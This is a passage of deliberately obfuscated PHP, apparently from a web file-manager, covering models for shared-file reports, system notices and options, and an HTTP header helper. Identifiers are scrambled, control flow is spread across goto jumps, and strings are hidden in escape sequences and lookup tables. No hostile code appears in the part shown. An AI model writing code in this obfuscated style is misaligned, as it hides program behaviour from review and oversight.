Model($cïÄÇïÄó³[514])->eventShare($c¦õËóëßÑ[$cïÄÇïÄó³[378]], $cïÄÇïÄó³[2224]); } } return $f‚æøôŠ¯¦; goto fóïœ‰¶«İ; fóïœ‰¶«İ: } protected function removeBySource($câñç’æÌí) { goto fÃù¡šÌİÜ; fÃù¡šÌİÜ: $B…£î²¹•… =& $_SERVER[í…¶]; $FÁÚˆˆˆ¼µ = array($B…£î²¹•…[392] => array($B…£î²¹•…[393], $câñç’æÌí)); $AŸàªˆ¢¦æ = $this->field($B…£î²¹•…[450])->where($FÁÚˆˆˆ¼µ)->select(); goto DĞà­Ğ™®; DĞà­Ğ™®: $AŸàªˆ¢¦æ = array_to_keyvalue($AŸàªˆ¢¦æ, $B…£î²¹•…[33], $B…£î²¹•…[450]); if (!$AŸàªˆ¢¦æ) { return; } $FÁÚˆˆˆ¼µ = array($B…£î²¹•…[449] => array($B…£î²¹•…[393], $AŸàªˆ¢¦æ)); goto Aø‡ÛÛ¡Ë¦; Aø‡ÛÛ¡Ë¦: $this->where($FÁÚˆˆˆ¼µ)->delete(); Model($B…£î²¹•…[546])->where($FÁÚˆˆˆ¼µ)->delete(); goto EÄ±º¯»ƒø; EÄ±º¯»ƒø: } public function listAll($FİïÈôÜ‰À) { goto aÇÚèè†×›; DŸÜ’…·¿è: return $E®³‰¹Ô; goto dÂå¹ÃÓ‡; e»Ô˜†‡âİ: $E®³‰¹Ô = $this->_makeOrder()->where($Dé‰¤Çà–)->selectPage(20); if (empty($E®³‰¹Ô[$a«åÓ¢ìÎ‡[363]])) { return array(); } $this->_listDataApply($E®³‰¹Ô[$a«åÓ¢ìÎ‡[363]]); goto DŸÜ’…·¿è; E‘Ùò‰ó×”: if ($FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[704]]) { $DÚ¤ÔÙ‚Æ÷ = $FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[705]] ? $FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[705]] : strtotime(date($a«åÓ¢ìÎ‡[2240])); $Dé‰¤Çà–[$a«åÓ¢ìÎ‡[187]] = array($a«åÓ¢ìÎ‡[321], array($FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[704]], $DÚ¤ÔÙ‚Æ÷)); } if ($FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[29]]) { $Dé‰¤Çà–[$FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[29]]] = 1; } else { $Dé‰¤Çà–[] = array($a«åÓ¢ìÎ‡[455] => array($a«åÓ¢ìÎ‡[924], 0), $a«åÓ¢ìÎ‡[457] => array($a«åÓ¢ìÎ‡[924], 0), $a«åÓ¢ìÎ‡[2215] => $a«åÓ¢ìÎ‡[2183]); } if ($FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[2179]]) { $Dé‰¤Çà–[] = array($a«åÓ¢ìÎ‡[452] => $FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[2179]], $a«åÓ¢ìÎ‡[1339] => array($a«åÓ¢ìÎ‡[754], "\x25{$FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[2179]]}\45"), $a«åÓ¢ìÎ‡[2215] => $a«åÓ¢ìÎ‡[2183]); } goto e»Ô˜†‡âİ; aÇÚèè†×›: $a«åÓ¢ìÎ‡ =& $_SERVER[í…¶]; $Dé‰¤Çà– = array(); if ($FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[1433]]) { $Dé‰¤Çà–[$a«åÓ¢ìÎ‡[1433]] = $FİïÈôÜ‰À[$a«åÓ¢ìÎ‡[1433]]; } goto E‘Ùò‰ó×”; dÂå¹ÃÓ‡: } public function listDataApply($b´Â¹®×œ–) { $this->_listDataApply($b´Â¹®×œ–); return $b´Â¹®×œ–; } private function _listDataApply(&$D°«¿Ò–£Ú) { $A‘ì»ŒÅ ‰ =& $_SERVER[í…¶]; $eÅÒÇÉÜìÛ = array_to_keyvalue($D°«¿Ò–£Ú, $A‘ì»ŒÅ ‰[33], $A‘ì»ŒÅ ‰[1433]); $f¸Š­Á´À = Model($A‘ì»ŒÅ ‰[486])->userListInfo(array_unique($eÅÒÇÉÜìÛ)); $f¸Ş¬ŞŒé = array_to_keyvalue($D°«¿Ò–£Ú, $A‘ì»ŒÅ ‰[33], $A‘ì»ŒÅ ‰[378]); $CÄæ­­œêÊ = Model($A‘ì»ŒÅ ‰[755])->sourceListInfo($f¸Ş¬ŞŒé, !0); foreach ($D°«¿Ò–£Ú as &$d¶ÇİÌ›¬) { $e«çëë¤êÜ = $d¶ÇİÌ›¬[$A‘ì»ŒÅ ‰[1433]]; $d¶ÇİÌ›¬[$A‘ì»ŒÅ ‰[2241]] = $f¸Š­Á´À[$e«çëë¤êÜ] ? $f¸Š­Á´À[$e«çëë¤êÜ] : !1; $a¨Ñ‰Ş­–´ = $d¶ÇİÌ›¬[$A‘ì»ŒÅ ‰[378]]; $d¶ÇİÌ›¬[$A‘ì»ŒÅ ‰[400]] = $CÄæ­­œêÊ[$a¨Ñ‰Ş­–´] ? $CÄæ­­œêÊ[$a¨Ñ‰Ş­–´] : !1; } } private function _makeOrder($D÷›ÊÑ¥ó® = '') { goto bÄÆÍ¦ªï¿; aÄ´¼×ØÊ: $aÔ·¸ç‘”¤ = Input::get($FÖ”¾–ªÅ[416], $FÖ”¾–ªÅ[7], $FÖ”¾–ªÅ[398], $bÒ°Æ˜Ğ¿Å); $dµÊÃİÛ• = Input::get($FÖ”¾–ªÅ[417], $FÖ”¾–ªÅ[7], $FÖ”¾–ªÅ[2242], array($FÖ”¾–ªÅ[2178], $FÖ”¾–ªÅ[413])); $dµÊÃİÛ• = $aˆ÷Ş‚á¬Í[$dµÊÃİÛ•]; goto DÜ¤Üâñ; bÄÆÍ¦ªï¿: $FÖ”¾–ªÅ =& $_SERVER[í…¶]; $bÒ°Æ˜Ğ¿Å = array($FÖ”¾–ªÅ[187], $FÖ”¾–ªÅ[705], $FÖ”¾–ªÅ[2227], $FÖ”¾–ªÅ[2228]); $aˆ÷Ş‚á¬Í = array($FÖ”¾–ªÅ[411] => $FÖ”¾–ªÅ[412], $FÖ”¾–ªÅ[413] => $FÖ”¾–ªÅ[414]); goto aÄ´¼×ØÊ; DÜ¤Üâñ: $D÷›ÊÑ¥ó® = $D÷›ÊÑ¥ó® . "{$aÔ·¸ç‘”¤}\40{$dµÊÃİÛ•}"; return $this->order($D÷›ÊÑ¥ó®); goto fíÏÛ ³ô; fíÏÛ ³ô: } public function reportAdd($c¼«×éÉ·á) { $c£èÅ†öè =& $_SERVER[í…¶]; $a£ó–ÕÅÁ¯ = array($c£èÅ†öè[450] => $c¼«×éÉ·á[$c£èÅ†öè[450]], $c£èÅ†öè[1433] => USER_ID); if (Model($c£èÅ†öè[2238])->where($a£ó–ÕÅÁ¯)->find()) { return !1; } $Dè²¸ôİÖè = array($c£èÅ†öè[450] => $c¼«×éÉ·á[$c£èÅ†öè[450]], $c£èÅ†öè[1339] => $c¼«×éÉ·á[$c£èÅ†öè[1339]], $c£èÅ†öè[378] => $c¼«×éÉ·á[$c£èÅ†öè[378]], $c£èÅ†öè[428] => $c¼«×éÉ·á[$c£èÅ†öè[428]], $c£èÅ†öè[1433] => USER_ID, $c£èÅ†öè[29] => $c¼«×éÉ·á[$c£èÅ†öè[29]], $c£èÅ†öè[414] => $c¼«×éÉ·á[$c£èÅ†öè[414]]); return Model($c£èÅ†öè[2238])->add($Dè²¸ôİÖè); } public function reportList($bëä”†°Ü®) { goto Fê¼èÌø•; aí‘¾ïŞ©Ô: if (empty($e…”Û¤İ˜â[$cğ”˜¶×§Ï[363]])) { return array(); } $this->_listDataApply($e…”Û¤İ˜â[$cğ”˜¶×§Ï[363]]); return $e…”Û¤İ˜â; goto C‡Ü‹šÅ‹­; F¹Ê´ ´Œ: $d ùÁ×°ëÍ = array($cğ”˜¶×§Ï[411] => $cğ”˜¶×§Ï[412], $cğ”˜¶×§Ï[413] => $cğ”˜¶×§Ï[414]); $a…‹êÌùÙæ = $cğ”˜¶×§Ï[2246] . $d ùÁ×°ëÍ[$aÑççä‚›Ã]; $e…”Û¤İ˜â = Model($cğ”˜¶×§Ï[2238])->where($cÀâÆ“µ¢À)->order($a…‹êÌùÙæ)->selectPage(20); goto aí‘¾ïŞ©Ô; EâóÔ½é: if (isset($bëä”†°Ü®[$cğ”˜¶×§Ï[29]]) && in_array($bëä”†°Ü®[$cğ”˜¶×§Ï[29]], array($cğ”˜¶×§Ï[83], $cğ”˜¶×§Ï[2243], $cğ”˜¶×§Ï[2244], $cğ”˜¶×§Ï[2245], $cğ”˜¶×§Ï[1916]))) { $cÀâÆ“µ¢À[$cğ”˜¶×§Ï[29]] = $bëä”†°Ü®[$cğ”˜¶×§Ï[29]]; } if (isset($bëä”†°Ü®[$cğ”˜¶×§Ï[691]]) && in_array($bëä”†°Ü®[$cğ”˜¶×§Ï[691]], array($cğ”˜¶×§Ï[477], $cğ”˜¶×§Ï[83], $cğ”˜¶×§Ï[2243], $cğ”˜¶×§Ï[2244]))) { $cÀâÆ“µ¢À[$cğ”˜¶×§Ï[691]] = $bëä”†°Ü®[$cğ”˜¶×§Ï[691]]; } $aÑççä‚›Ã = Input::get($cğ”˜¶×§Ï[417], $cğ”˜¶×§Ï[7], $cğ”˜¶×§Ï[2242], array($cğ”˜¶×§Ï[2178], $cğ”˜¶×§Ï[413])); goto F¹Ê´ ´Œ; Fê¼èÌø•: $cğ”˜¶×§Ï =& $_SERVER[í…¶]; $cÀâÆ“µ¢À = array(); if ($bëä”†°Ü®[$cğ”˜¶×§Ï[704]]) { $C—‹©¢„Ú„ = $bëä”†°Ü®[$cğ”˜¶×§Ï[705]] ? $bëä”†°Ü®[$cğ”˜¶×§Ï[705]] : strtotime(date($cğ”˜¶×§Ï[2240])); $cÀâÆ“µ¢À[$cğ”˜¶×§Ï[187]] = array($cğ”˜¶×§Ï[321], array($bëä”†°Ü®[$cğ”˜¶×§Ï[704]], $C—‹©¢„Ú„)); } goto EâóÔ½é; C‡Ü‹šÅ‹­: } public function reportStatus($D±®µ¨œ) { goto dé‚¨è”ìƒ; D­•àˆ³¯ğ: return $b‡‹ÄÅÛ¦¹; goto C¢’‰¹ó«; fé¾×†ìÛ: if (!$eåÉÇˆ¨ƒ¥) { return !1; } $A ˜ÎÇôŠ… = array($aƒ‘ ì×¸[691] => $D±®µ¨œ[$aƒ‘ ì×¸[691]]); if ($D±®µ¨œ[$aƒ‘ ì×¸[691]] == $aƒ‘ ì×¸[2244] && $eåÉÇˆ¨ƒ¥[$aƒ‘ ì×¸[691]] == $aƒ‘ ì×¸[2244]) { $A ˜ÎÇôŠ…[$aƒ‘ ì×¸[691]] = 0; } goto c•ØÁ¼¾Ä; dé‚¨è”ìƒ: $aƒ‘ ì×¸ =& $_SERVER[í…¶]; $b½»´¬ŞÅ = array($aƒ‘ ì×¸[376] => $D±®µ¨œ[$aƒ‘ ì×¸[376]]); $eåÉÇˆ¨ƒ¥ = Model($aƒ‘ ì×¸[2238])->where($b½»´¬ŞÅ)->field($aƒ‘ ì×¸[2247])->find(); goto fé¾×†ìÛ; c•ØÁ¼¾Ä: $b‡‹ÄÅÛ¦¹ = Model($aƒ‘ ì×¸[2238])->where($b½»´¬ŞÅ)->save($A ˜ÎÇôŠ…); if ($D±®µ¨œ[$aƒ‘ ì×¸[691]] == $aƒ‘ ì×¸[2243]) { if ($eåÉÇˆ¨ƒ¥[$aƒ‘ ì×¸[428]] != $aƒ‘ ì×¸[477] && $this->shareFileMeta($eåÉÇˆ¨ƒ¥[$aƒ‘ ì×¸[428]])) { $this->shareFileMeta($eåÉÇˆ¨ƒ¥[$aƒ‘ ì×¸[428]], 0); } $this->remove($eåÉÇˆ¨ƒ¥[$aƒ‘ ì×¸[450]]); return !0; } if ($b‡‹ÄÅÛ¦¹ && $D±®µ¨œ[$aƒ‘ ì×¸[691]] == $aƒ‘ ì×¸[2244]) { $a‡®­ˆ¿Ù = $A ˜ÎÇôŠ…[$aƒ‘ ì×¸[691]] == $aƒ‘ ì×¸[2244] ? 1 : 0; $this->shareFileMeta($eåÉÇˆ¨ƒ¥[$aƒ‘ ì×¸[428]], $a‡®­ˆ¿Ù); $this->removeByFile($eåÉÇˆ¨ƒ¥[$aƒ‘ ì×¸[428]]); } goto D­•àˆ³¯ğ; C¢’‰¹ó«: } private function removeByFile($bÇ¹İ˜ŸôÕ) { goto F‘·Ø¿¦‹Ñ; aİ«˜Äñè: $C©ÉÃµ¡ÑÜ = array($A¬éÛ¤õ§×[378] => array($A¬éÛ¤õ§×[7], $Dšë½õ…¡), $A¬éÛ¤õ§×[455] => 1); $a•ƒáÏ¬œ‹ = Model($A¬éÛ¤õ§×[2078])->where($C©ÉÃµ¡ÑÜ)->field($A¬éÛ¤õ§×[450])->select(); if (empty($a•ƒáÏ¬œ‹)) { return; } goto bìˆÂåãÁ¨; F‘·Ø¿¦‹Ñ: $A¬éÛ¤õ§× =& $_SERVER[í…¶]; $a•ƒáÏ¬œ‹ = Model($A¬éÛ¤õ§×[755])->where(array($A¬éÛ¤õ§×[428] => $bÇ¹İ˜ŸôÕ))->field($A¬éÛ¤õ§×[378])->select(); $Dšë½õ…¡ = array_to_keyvalue($a•ƒáÏ¬œ‹, $A¬éÛ¤õ§×[33], $A¬éÛ¤õ§×[378]); goto aİ«˜Äñè; bìˆÂåãÁ¨: $D˜äÖ¯À¨ = array_to_keyvalue($a•ƒáÏ¬œ‹, $A¬éÛ¤õ§×[33], $A¬éÛ¤õ§×[450]); $this->remove($D˜äÖ¯À¨); goto E„‡Ğ£‰’½; E„‡Ğ£‰’½: } private function shareFileMeta($eƒâğãØø÷, $c†èÆØïÉ£ = null) { $a×ß´áÃƒ =& $_SERVER[í…¶]; $E¼×™ÑØÊ = array($a×ß´áÃƒ[428] => $eƒâğãØø÷, $a×ß´áÃƒ[89] => $a×ß´áÃƒ[2248]); if (is_null($c†èÆØïÉ£)) { return Model($a×ß´áÃƒ[2249])->where($E¼×™ÑØÊ)->find(); } $E¼×™ÑØÊ[$a×ß´áÃƒ[368]] = $c†èÆØïÉ£; Model($a×ß´áÃƒ[2249])->add($E¼×™ÑØÊ, array(), !0); } } goto dõñ™…“³; bÒã†ïöï: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x6e\157\164\x69\143\145\114\x69\x73\164"; public $field = array("\156\141\155\145", "\143\157\156\164\x65\x6e\164", "\141\x75\164\150", "\x6d\x6f\x64\x65", "\164\151\155\x65", "\x74\x79\x70\145", "\154\145\x76\145\x6c", "\x65\x6e\x61\x62\154\x65", "\x73\x6f\x72\x74"); public function listData($B”˜«ÛÕ™Ò = false, $aŸƒ¹ó—Ğ¹ = "\163\157\162\164", $Fµê™‹¤‰« = false) { return parent::listData($B”˜«ÛÕ™Ò, $aŸƒ¹ó—Ğ¹, $Fµê™‹¤‰«); } public function add($DÌ ííÈÖ) { $B«¦¡êè¡³ =& $_SERVER[í…¶]; $Cƒï¿˜æ¥ = time(); if ($DÌ ííÈÖ[$B«¦¡êè¡³[12]] == $B«¦¡êè¡³[2473]) { $Cƒï¿˜æ¥ = strtotime($DÌ ííÈÖ[$B«¦¡êè¡³[190]]); } $DÌ ííÈÖ[$B«¦¡êè¡³[190]] = $Cƒï¿˜æ¥; return parent::insert($DÌ ííÈÖ); } public function update($F¼¯°“­šĞ, $cö¤Àò‰¹µ) { goto fÛááÕŠö; fÛááÕŠö: $aÉÓİñ‘Âï =& $_SERVER[í…¶]; $E©ÇçµšçÊ = $this->listData($F¼¯°“­šĞ); if (!$E©ÇçµšçÊ) { return !1; } goto C¸ÒÖ¶à…Î; C¸ÒÖ¶à…Î: $dÕƒÂçÅÉ = time(); if ($cö¤Àò‰¹µ[$aÉÓİñ‘Âï[12]] == $aÉÓİñ‘Âï[2473]) { $dÕƒÂçÅÉ = strtotime($cö¤Àò‰¹µ[$aÉÓİñ‘Âï[190]]); } $cö¤Àò‰¹µ[$aÉÓİñ‘Âï[190]] = $dÕƒÂçÅÉ; goto Bà¿îòÛ¹º; Bà¿îòÛ¹º: return parent::update($F¼¯°“­šĞ, $cö¤Àò‰¹µ); goto EÚ…Šãƒ“•; EÚ…Šãƒ“•: } public function remove($fßãÙíå÷) { $BµåáÄõâ– = $this->listData($fßãÙíå÷); if (!$BµåáÄõâ– || $BµåáÄõâ–[$_SERVER[í…¶][1078]]) { return !1; } return parent::remove($fßãÙíå÷); } public function sort($fõ ŠİŸ´Œ, $Eˆô¸ô¾¬) { return parent::update($fõ ŠİŸ´Œ, $Eˆô¸ô¾¬); } public function enable($a‹»¥º“àõ, $b¾öŠÕ¢„‚) { return parent::update($a‹»¥º“àõ, array($_SERVER[í…¶][2474] => $b¾öŠÕ¢„‚)); } private function initUserOption() { $FÙéƒ¶Í¢ƒ =& $_SERVER[í…¶]; $this->optionType = $FÙéƒ¶Í¢ƒ[2475]; $this->modelType = $FÙéƒ¶Í¢ƒ[2476]; $this->field = array($FÙéƒ¶Í¢ƒ[2477], $FÙéƒ¶Í¢ƒ[28], $FÙéƒ¶Í¢ƒ[190], $FÙéƒ¶Í¢ƒ[29], $FÙéƒ¶Í¢ƒ[2478], $FÙéƒ¶Í¢ƒ[691], $FÙéƒ¶Í¢ƒ[183]); } public function userNoticeGet($C‘ËÄÄã»  = false) { $this->initUserOption(); return parent::listData($C‘ËÄÄã» , $_SERVER[í…¶][376], !0); } public function userNoticeAdd($d†Óøº«ÀÁ) { $då™›ÂÌó =& $_SERVER[í…¶]; $this->initUserOption(); $DŠÓ´¥Óâ = $this->findByKey($då™›ÂÌó[2477], $d†Óøº«ÀÁ[$då™›ÂÌó[376]]); if ($DŠÓ´¥Óâ) { return !0; } $e õæå»¥Ğ = array($då™›ÂÌó[2477] => $d†Óøº«ÀÁ[$då™›ÂÌó[376]], $då™›ÂÌó[28] => $d†Óøº«ÀÁ[$då™›ÂÌó[28]], $då™›ÂÌó[190] => $d†Óøº«ÀÁ[$då™›ÂÌó[190]], $då™›ÂÌó[29] => isset($d†Óøº«ÀÁ[$då™›ÂÌó[29]]) ? $d†Óøº«ÀÁ[$då™›ÂÌó[29]] : 1, $då™›ÂÌó[2478] => isset($d†Óøº«ÀÁ[$då™›ÂÌó[2478]]) ? $d†Óøº«ÀÁ[$då™›ÂÌó[2478]] : 0, $då™›ÂÌó[691] => 0, $då™›ÂÌó[183] => 0); return parent::insert($e õæå»¥Ğ); } public function userNoticeEdit($C‰¨ÑÑ“Àõ, $BÕ¥¼À Ç) { $this->initUserOption(); return parent::update($C‰¨ÑÑ“Àõ, $BÕ¥¼À Ç); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\155\137\157\x70\164\151\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\162\157\x6c\145", "\162\157\x6c\145\x47\162\157\x75\x70", "\162\x65\147\151\163\164", "\145\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($cº–…‰²Ú–) { return "\123\171\163\164\x65\155\117\x70\164\151\157\x6e\137{$cº–…‰²Ú–}"; } protected function optionDefault($A†àåóÉ = '') { $Eæƒ¿–ì‹š =& $_SERVER[í…¶]; if ($A†àåóÉ == $Eæƒ¿–ì‹š[33]) { return $GLOBALS[$Eæƒ¿–ì‹š[6]][$Eæƒ¿–ì‹š[2479]]; } } } class SystemRecordModel extends ModelBaseLight { } goto bìÙãÎ¨¨; b¼¡Ìîâ²: class HttpHeader { public static $_headers = array("\x48\x6f\163\164" => "\x48\x54\124\120\x5f\110\117\x53\124", "\125\163\x65\162\55\101\x67\x65\x6e\x74" => "\110\124\124\120\x5f\125\x53\x45\x52\x5f\x41\107\x45\x4e\124", "\103\157\156\x74\x65\156\x74\55\x54\171\x70\x65" => "\110\124\x54\x50\x5f\103\x4f\116\124\105\x4e\124\137\124\131\120\x45", "\103\x6f\156\164\145\156\164\55\x4c\x65\x6e\147\164\150" => "\110\124\124\120\x5f\103\x4f\x4e\124\105\116\124\137\x4c\x45\116\x47\x54\x48", "\x44\x65\160\164\150" => "\110\124\124\120\137\104\x45\x50\x54\x48", "\105\x78\x70\145\x63\164" => "\110\x54\x54\120\x5f\x45\x58\x50\105\103\x54", "\x49\x66\x2d\116\x6f\156\145\x2d\x4d\141\x74\143\150" => "\x48\124\x54\x50\137\111\106\137\x4e\117\116\105\137\x4d\x41\x54\x43\x48", "\111\x66\55\x4d\x61\164\x63\x68" => "\110\x54\x54\x50\x5f\x49\106\x5f\115\x41\124\x43\x48", "\111\146\55\x52\x61\x6e\x67\145" => "\110\x54\124\120\x5f\x49\106\x5f\x52\101\116\x47\x45", "\x4c\x61\163\164\x2d\115\x6f\144\x69\x66\x69\x65\144" => "\110\x54\124\120\x5f\x4c\101\x53\x54\x5f\115\117\104\111\x46\x49\x45\104", "\111\146\x2d\x4d\157\x64\x69\x66\x69\145\x64\x2d\123\151\156\x63\145" => "\110\124\124\x50\x5f\x49\x46\137\x4d\117\x44\111\x46\111\105\x44\137\x53\111\x4e\103\x45", "\111\146\x2d\125\x6e\x6d\157\144\151\x66\x69\145\x64\x2d\x53\x69\x6e\x63\145" => "\x48\124\124\120\137\x49\106\x5f\125\116\115\117\x44\x49\x46\x49\105\x44\x5f\123\x49\116\103\x45", "\122\141\x6e\x67\145" => "\110\124\x54\x50\x5f\122\101\116\107\x45", "\x54\x69\155\145\x6f\x75\164" => "\110\x54\124\x50\x5f\x54\111\115\x45\x4f\x55\x54", "\111\146" => "\x48\x54\x54\x50\137\x49\x46", "\114\157\x63\153\x2d\x54\x6f\x6b\145\x6e" => "\x48\124\x54\x50\x5f\114\x4f\x43\x4b\137\124\x4f\113\x45\116", "\117\166\x65\x72\167\x72\151\x74\145" => "\110\124\x54\120\x5f\x4f\x56\105\122\x57\122\111\124\105", "\104\145\163\164\x69\x6e\141\164\151\157\x6e" => "\110\124\x54\120\x5f\x44\x45\x53\x54\111\116\101\124\111\117\x4e", "\x52\x65\161\x75\x65\163\164\55\x49\144" => "\122\105\121\x55\x45\123\124\137\x49\x44", "\x52\145\161\165\x65\x73\x74\55\102\157\x64\171\55\106\151\x6c\145" => "\x52\105\x51\125\105\x53\124\x5f\102\x4f\x44\131\x5f\x46\111\x4c\x45", "\x52\x65\x64\x69\x72\145\143\x74\55\123\x74\x61\x74\x75\163" => "\122\x45\104\x49\122\x45\x43\x54\137\x53\x54\101\x54\x55\x53"); public static function init() { static $EŠ®Ë›·æ« = false; if ($EŠ®Ë›·æ«) { return; } foreach ($_SERVER as $aâÒŒ·µ°‚ => $D×—¯«ìÔ») { $aâÒŒ·µ°‚ = strtoupper($aâÒŒ·µ°‚); if (!array_key_exists($aâÒŒ·µ°‚, $_SERVER)) { continue; } $_SERVER[$aâÒŒ·µ°‚] = $D×—¯«ìÔ»; } foreach (self::$_headers as $aâÒŒ·µ°‚ => $eÎ©ˆŒŒ) { if (!array_key_exists($aâÒŒ·µ°‚, $_SERVER)) { continue; } $_SERVER[$aâÒŒ·µ°‚] = $_SERVER[$eÎ©ˆŒŒ]; $_SERVER[strtoupper($aâÒŒ·µ°‚)] = $_SERVER[$eÎ©ˆŒŒ]; } } public static function get($a‡’„ø…”Å) { self::init(); return $_SERVER[$a‡’„ø…”Å] ? $_SERVER[$a‡’„ø…”Å] : $_SERVER[$_SERVER[í…¶][1825] . strtoupper($a‡’„ø…”Å)]; } public static function method() { return strtoupper(self::get($_SERVER[í…¶][154])); } public static function length() { $A˜Îá‹ÜŒ¼ =& $_SERVER[í…¶]; $D†š·‰®Ä = self::get($A˜Îá‹ÜŒ¼[1826]); if (!$D†š·‰®Ä) { $D†š·‰®Ä = self::get($A˜Îá‹ÜŒ¼[1144]); } return $D†š·‰®Ä; } public static function range() { $aŠœ×™„æ÷ =& $_SERVER[í…¶]; $fÛŞ…ß¾ßğ = self::get($aŠœ×™„æ÷[198]); if (!$fÛŞ…ß¾ßğ) { return !1; } if (!preg_match($aŠœ×™„æ÷[1827], $fÛŞ…ß¾ßğ, $A«™¾»¸»)) { return !1; } if ($A«™¾»¸»[1] === $aŠœ×™„æ÷[33] && $A«™¾»¸»[2] === $aŠœ×™„æ÷[33]) { return !1; } return array($A«™¾»¸»[1] !== $aŠœ×™„æ÷[33] ? $A«™¾»¸»[1] : null, $A«™¾»¸»[2] !== $aŠœ×™„æ÷[33] ? $A«™¾»¸»[2] : null); } public static $statusCode = array("\x31\60\60" => "\103\157\156\164\x69\x6e\x75\145", "\61\60\x31" => "\x53\x77\x69\x74\143\x68\x69\156\x67\x20\x50\x72\157\x74\157\143\x6f\154", "\x31\60\x32" => "\120\162\157\x63\x65\163\163\x69\x6e\147", "\61\60\x33" => "\105\141\162\154\x79\40\110\x69\x6e\164\x73", "\62\x30\60" => "\x4f\113", "\62\x30\61" => "\103\162\x65\x61\164\145\x64", "\62\x30\x32" => "\x41\143\x63\145\160\164\x65\144", "\62\60\x33" => "\116\x6f\x6e\55\x41\165\164\150\157\x72\151\x74\141\x74\x69\166\145\40\111\x6e\x66\x6f\162\x6d\x61\x74\151\157\156", "\x32\x30\x34" => "\x4e\157\40\x43\157\x6e\164\x65\156\x74", "\62\60\x35" => "\x52\145\x73\x65\x74\40\103\x6f\x6e\x74\145\156\x74", "\x32\60\66" => "\120\141\162\164\x69\141\154\40\103\157\x6e\x74\x65\156\164", "\x32\60\x37" => "\115\x75\154\164\151\x2d\123\x74\x61\164\x75\x73", "\x33\x30\60" => "\x4d\x75\154\x74\151\x70\x6c\x65\x20\103\150\x6f\x69\x63\145\x73", "\63\60\61" => "\x4d\157\x76\x65\x64\40\x50\145\162\155\x61\x6e\145\x6e\x74\154\x79", "\63\x30\x32" => "\106\x6f\165\x6e\144", "\63\x30\x33" => "\123\145\145\x20\117\164\150\145\162", "\63\60\64" => "\x4e\157\x74\x20\115\157\144\151\x66\151\145\144", "\x33\x30\x35" => "\x55\x73\145\x20\120\162\x6f\170\x79", "\63\60\67" => "\124\145\x6d\x70\157\162\141\162\x79\x20\x52\145\x64\x69\162\145\x63\x74", "\63\60\x38" => "\x50\x65\x72\x6d\141\156\x65\156\x74\40\122\x65\144\151\162\x65\x63\x74", "\x34\60\60" => "\102\141\144\x20\x52\145\161\x75\145\x73\x74", "\x34\60\61" => "\125\156\x61\165\164\x68\x6f\x72\151\172\x65\x64", "\64\x30\62" => "\x50\x61\171\x6d\145\156\164\40\x52\x65\x71\x75\x69\x72\145\x64", "\x34\60\63" => "\x46\x6f\x72\142\151\144\144\x65\156", "\64\60\x34" => "\116\x6f\164\x20\x46\157\165\156\144", "\x34\x30\65" => "\115\x65\x74\x68\157\x64\x20\116\157\x74\x20\101\x6c\154\157\x77\x65\144", "\x34\x30\x36" => "\116\157\x74\40\101\x63\x63\x65\160\x74\x61\x62\154\145", "\64\x30\67" => "\120\x72\x6f\170\171\40\x41\165\164\150\145\156\164\x69\x63\141\x74\151\157\x6e\x20\x52\x65\x71\165\151\162\145\x64", "\64\x30\70" => "\x52\145\x71\x75\145\x73\x74\x20\x54\x69\155\x65\x6f\165\x74", "\x34\60\x39" => "\x43\157\x6e\146\154\151\143\164", "\64\x31\60" => "\x47\x6f\x6e\145", "\x34\61\x31" => "\x4c\145\x6e\147\x74\150\40\122\x65\x71\165\x69\162\145\x64", "\x34\61\62" => "\120\162\145\x63\x6f\156\144\151\164\151\157\x6e\40\106\x61\151\154\145\144", "\64\61\x33" => "\122\x65\161\165\145\163\x74\x20\105\x6e\164\x69\164\171\40\x54\157\x6f\x20\x4c\141\162\x67\145", "\64\x31\x34" => "\122\x65\161\x75\145\x73\164\x20\125\x52\111\x20\124\x6f\x6f\x20\x4c\x61\x72\147\145", "\64\61\x35" => "\125\156\163\165\x70\x70\157\x72\164\x65\x64\40\115\145\144\x69\x61\x20\x54\171\160\145", "\64\61\x36" => "\122\x65\x71\165\x65\163\164\x65\x64\40\x52\x61\156\x67\145\40\116\x6f\x74\40\x53\141\164\x69\x73\x66\151\141\x62\x6c\x65", "\x34\61\x37" => "\x45\x78\160\145\x63\164\x61\164\151\x6f\x6e\40\x46\x61\x69\154\145\x64", "\x34\x32\x32" => "\125\156\x70\x72\157\x63\x65\x73\x73\141\142\x6c\145\x20\x45\x6e\x74\151\164\x79", "\x34\62\x33" => "\x4c\157\x63\x6b\145\144", "\x34\62\64" => "\x46\141\x69\x6c\x65\x64\40\104\x65\x70\145\x6e\x64\145\156\143\x79", "\64\62\65" => "\x55\x6e\x6f\162\x64\x65\162\145\x64\x20\x43\157\154\154\x65\143\164\x69\x6f\156", "\64\62\66" => "\x55\160\147\162\141\x64\145\x20\x52\145\161\165\151\x72\145\144", "\64\62\x38" => "\120\x72\145\143\x6f\156\x64\151\164\x69\x6f\156\40\122\145\x71\x75\x69\x72\x65\x64", "\x34\x32\71" => "\x54\x6f\157\40\115\x61\x6e\171\40\122\145\161\x75\145\x73\164\x73", "\x34\63\61" => "\x52\x65\x71\x75\145\x73\x74\40\110\145\141\144\x65\162\40\x46\x69\145\x6c\144\163\40\124\x6f\x6f\x20\114\x61\162\147\145", "\x34\x34\64" => "\116\157\x20\x52\x65\163\160\157\156\x73\x65", "\x34\x35\x30" => "\x42\x6c\157\143\x6b\x65\144\40\142\x79\x20\127\151\x6e\x64\x6f\x77\x73\40\120\x61\x72\x65\156\164\x61\x6c\x20\103\157\x6e\164\x72\157\x6c\163", "\x34\65\x31" => "\x55\x6e\141\x76\x61\151\154\141\x62\154\145\x20\x46\157\162\40\114\145\x67\141\x6c\40\x52\145\x61\x73\157\x6e\163", "\64\71\x34" => "\x52\x65\x71\165\x65\163\x74\x20\x48\145\x61\144\x65\162\x20\124\x6f\x6f\x20\114\141\162\147\x65", 